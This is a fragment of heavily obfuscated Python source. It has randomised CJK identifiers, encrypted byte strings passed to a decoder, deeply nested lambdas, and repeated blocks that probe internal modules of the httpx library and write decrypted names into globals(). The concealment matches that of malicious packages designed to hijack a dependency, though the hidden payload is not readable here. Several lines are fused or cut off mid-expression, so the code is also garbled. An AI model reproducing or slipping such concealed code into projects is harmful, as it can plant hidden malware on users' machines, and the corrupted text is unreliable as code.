樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722254495, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722244886, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722252035, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245588, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722248784, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722242434]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._models
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._multipart
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._status_codes
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._transports
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._types
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 